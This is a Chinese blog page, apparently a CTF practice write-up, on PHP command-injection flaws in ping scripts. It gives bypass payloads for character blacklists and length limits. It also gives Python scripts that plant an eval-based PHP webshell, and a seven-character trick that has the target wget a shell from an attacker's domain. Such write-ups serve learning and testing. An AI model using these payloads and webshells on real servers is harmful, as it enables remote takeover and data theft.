@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang=>
+  <head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="">
+  <meta name="keywords" content="root">
+  
+    <link rel="icon" href="/favicon.ico">
+  
+    
+  <title>CTF练习之命令执行漏洞 | The clown is laughing at you</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class="logo" href="/">
+      <span>The clown is laughing at you</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id="post">
+  <div class="content">
+    <article>
+        <section class="content markdown-body">
+          <h1>CTF练习之命令执行漏洞</h1>
+          <div class="post-meta">
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019/07/01</time>
+            
+            
+          </div>
+          <p>前言：<br>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，<br>shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击</p>
+<p>通过几道题总结一下命令执行攻击</p>
+<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line"></span><br><span class="line">	$target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line">    <span class="comment">// var_dump($target);</span></span><br><span class="line">	$target=trim($target);</span><br><span class="line">	<span class="comment">// var_dump($target);</span></span><br><span class="line">	<span class="comment">// Set blacklist</span></span><br><span class="line">	$substitutions = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">';'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'|'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'-'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'$'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'('</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">')'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'`'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'||'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">	<span class="comment">// var_dump($target);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">	<span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Windows</span></span><br><span class="line">		</span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// *nix</span></span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  -c 1 '</span> . $target );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Feedback for the end user</span></span><br><span class="line">	<span class="keyword">echo</span>  <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这道题中，一般执行任意命令的几个常用符号被过滤掉了，所以我们这里使用%0a<br>payload为：<code>127.0.0.1%0awhoami</code><br>%0a作换行操作，在这里相当于先执行ping 127.0.0.1，再执行whoami</p>
+<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$ip = <span class="keyword">isset</span>($_POST[<span class="string">'ip'</span>])?$_POST[<span class="string">'ip'</span>]:<span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;/i'</span>,$ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"ip 格式错误!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> strlen($ip);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($ip)&lt;<span class="number">7</span>||strlen($ip)&gt;<span class="number">21</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"ip 长度错误!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Windows</span></span><br><span class="line">		</span><br><span class="line">	$cmd = shell_exec( <span class="string">'ping  '</span> .$ip );</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// *nix</span></span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  -c 1 '</span> .$ip );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Feedback for the end user</span></span><br><span class="line"><span class="keyword">echo</span>  <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br></pre></td></tr></table></figure>
+<p>先尝试如何绕过格式和长度的限制，payload:<code>ip=0.0.0.0|ls</code><br>但是我们读flag的时候就会出现长度错误的情况，<br><img src="/2019/07/01/CTF练习之命令执行漏洞/1.png" alt=""><br>所以我们要通过bash语句将一个bash脚本写入服务器，其中bash脚本的内容可以为带有一句话木马的shell.php，然后运行该bash脚本，写入shell.php到后台<br>python脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.199.153/CTF-master/exec/exec2.php"</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"echo '&lt;?php @eval($_GET[c]); ?&gt;' &gt;&gt; shell.php"</span>:</span><br><span class="line">    data = &#123;<span class="string">"ip"</span>:<span class="string">"0.0.0.0|echo -n \\"</span>+i+<span class="string">"&gt;&gt;1"</span>&#125;</span><br><span class="line">    req = requests.post(url,data=data)</span><br><span class="line">    print(data[<span class="string">"ip"</span>])</span><br><span class="line">print(<span class="string">"shell upload successfully"</span>)</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"ip"</span>:<span class="string">"0.0.0.0|bash 1"</span>&#125;</span><br><span class="line">req = requests.post(url,data=data)</span><br><span class="line">print(<span class="string">"getshell successfully"</span>)</span><br></pre></td></tr></table></figure></p>
+<p>我觉得这里有一个需要注意的地方是关于’\’转义，bash中’\’用于使得特使字符在其作用下，还是为其本身。</p>
+<p>getshell<br><img src="/2019/07/01/CTF练习之命令执行漏洞/2.png" alt=""></p>
+<p>这道题还有另外一种解法:<br>(1)需要自己有一个较短的域名<br>(2)在服务器的根目录下写入一个302跳转<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php </span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">"Location: ./1.sh"</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>(3)另外在根目录下写入一个bash脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.sh </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;?php @eval($_POST[1]);?&gt;'</span> &gt; shell.php</span><br></pre></td></tr></table></figure></p>
+<p>(4)这两个文件放在同一个目录下,执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip=0.0.0.0;wget i.com </span><br><span class="line">ip=0.0.0.0;sh index.html  <span class="comment">#刚好21个字符</span></span><br></pre></td></tr></table></figure></p>
+<p>然后就获取一个shell  </p>
+<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">8</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>升级版的写入shell,然后这个厉害了，七字shell<br>我们可以通过写入文件名的方法，获得一个bash脚本，<br>思路如下<br><img src="/2019/07/01/CTF练习之命令执行漏洞/3.png" alt=""><br>然后我们使用命令：<code>ls -t&gt;a</code><br>我们把bash语句分块写入文件后，倒着写，为了是可以按照写入时间去排列，默认下是按照字母顺序，然后ls -t是让文件名按写入该目录的时间排序，时间后的在前，&gt;a，保存着到a</p>
+<p>运行bash脚本，到我们的域名所在的服务器，去下载shell.php文件，这样就能成功getshell<br>关于这里为什么不echo写入语句话木马，由于字数的限制，所以需要拆分语句$_GET[1]</p>
+<p>这个被拆分后，就无法正常使用，所以我们使用方法二。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">!/usr/bin/python</span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetShell</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"http://192.168.56.129/shell.php?1="</span></span><br><span class="line">    fileNames = [<span class="string">"1.php"</span>,<span class="string">"-O\ \\"</span>,<span class="string">"cn\ \\"</span>,<span class="string">"\ a.\\"</span>,<span class="string">"wget\\"</span>] </span><br><span class="line">    <span class="comment"># linux创建中间有空格的文件名，需要转义，所以有请求"cn\ \\"</span></span><br><span class="line">    <span class="comment"># 可以修改hosts文件，让a.cn指向一个自己的服务器。</span></span><br><span class="line">    <span class="comment"># 在a.cn 的根目录下创建index.html ，内容是一个php shell </span></span><br><span class="line">    <span class="keyword">for</span> fileName <span class="keyword">in</span> fileNames:</span><br><span class="line">        createFileUrl = url+<span class="string">"&gt;"</span>+fileName</span><br><span class="line">        <span class="keyword">print</span> createFileUrl </span><br><span class="line">        requests.get(createFileUrl)</span><br><span class="line">    getShUrl = url + <span class="string">"ls -t&gt;1"</span></span><br><span class="line">    <span class="keyword">print</span> getShUrl</span><br><span class="line">    requests.get(getShUrl)</span><br><span class="line">    getShellUrl = url + <span class="string">"sh 1"</span></span><br><span class="line">    <span class="keyword">print</span> getShellUrl</span><br><span class="line">    requests.get(getShellUrl)</span><br><span class="line">    shellUrl = <span class="string">"http://192.168.56.129/1.php"</span></span><br><span class="line">    response = requests.get(shellUrl)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*] Get shell !"</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*] fail!"</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    GetShell()</span><br></pre></td></tr></table></figure></p>
+
+        </section>
+    </article>
+    
+        <!-- disqus 评论框 start -->
+        <div class="comment">
+            <div id="disqus_thread" class="disqus-thread">
+              <i>Loading comments box needs to over the wall</i>
+            </div>
+        </div>
+        <!-- disqus 评论框 end -->
+    
+    
+        <!-- livere 评论框 start -->
+        <div class="comment">
+            <div id="lv-container" data-id="city" data-uid="your_livere_uid"></div>
+        </div>
+        <!-- livere 评论框 end -->
+        
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01"><span class="toc-number">1.</span> <span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02"><span class="toc-number">2.</span> <span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03"><span class="toc-number">3.</span> <span class="toc-text">0x03</span></a></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+<!-- disqus 公共JS代码 -->
+<script type="text/javascript">
+  /* * * CONFIGURATION VARIABLES * * */
+  var disqus_shortname = "your_disqus_shortname";
+  var disqus_identifier = "http://yoursite.com/2019/07/01/CTF练习之命令执行漏洞/";
+  var disqus_url = "http://yoursite.com/2019/07/01/CTF练习之命令执行漏洞/";
+
+  isAgent(getDisqus)
+
+  // determine user agent in China
+  function isAgent(cb) {
+    var url = '//graph.facebook.com/feed?callback=h';
+    var xhr = new XMLHttpRequest();
+    var called = false;
+    xhr.open('GET', url);
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+      called = true;
+      cb(true);
+      }
+    };
+    xhr.send();
+    // timeout 1s, this facebook API is very fast.
+    setTimeout(function() {
+      if (!called) {
+      xhr.abort();
+      cb(false)
+      }
+    }, 1000);
+  }
+
+  function getDisqus(isAgent) {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; 
+    dsq.async = true
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq)
+  }
+</script>
+<!-- disqus 公共JS代码 end -->
+
+
+<script type="text/javascript">
+  (function(d, s) {
+      var j, e = d.getElementsByTagName(s)[0];
+
+      if (typeof LivereTower === 'function') { return; }
+
+      j = d.createElement(s);
+      j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+      j.async = true;
+
+      e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+</body>
+</html>
